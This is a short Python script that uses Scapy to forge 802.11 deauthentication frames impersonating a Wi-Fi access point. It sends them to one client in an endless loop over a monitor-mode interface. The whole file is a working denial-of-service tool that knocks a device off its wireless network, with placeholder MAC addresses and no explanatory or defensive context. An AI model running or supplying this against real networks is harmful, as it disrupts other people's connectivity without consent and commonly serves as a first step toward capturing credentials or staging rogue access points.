#!/usr/bin/env python3
import sys
from scapy.all import *

IFACE = 'mon0'
AP_MAC = 'ab:cd:ef:ab:cd:ef'
CLIENT_MAC = 'aa:bb:cc:aa:bb:cc'

packet = RadioTap() / \
         Dot11(type=0,         # Management type
               subtype=12,     # Deauthentication subtype
               addr1=CLIENT_MAC,
               addr2=AP_MAC,
               addr3=AP_MAC) / \
         Dot11Deauth(reason=7) # "Class 3 frame received from nonassociated STA."
while True:
    sendp(packet, iface=IFACE)

